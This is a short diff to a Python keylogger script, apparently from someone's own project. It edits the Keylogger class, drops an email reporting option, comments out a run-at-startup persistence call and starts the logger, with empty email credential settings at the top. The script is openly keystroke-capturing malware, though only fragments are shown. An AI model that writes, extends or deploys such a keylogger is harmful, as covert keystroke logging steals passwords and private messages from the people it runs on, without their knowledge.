@@ -14,12 +14,9 @@ EMAIL_PASSWORD = r""
 SEND_EMAIL = r""
 
 class Keylogger:
-    def __init__(self, interval, report_method="email"):
+    def __init__(self, interval):
         self.interval = interval
-        self.report_method = report_method
-
         self.log = ""
-
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
 
@@ -68,11 +65,8 @@ def run_at_startup():
 
 
 if __name__ == "__main__":
-    run_at_startup()
-    # wbopen("https://www.youtube.com/watch?v=7YuAzR2XVAM")
-    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
-    # print("started")
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    # run_at_startup()
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
     keylogger.start()
 
 
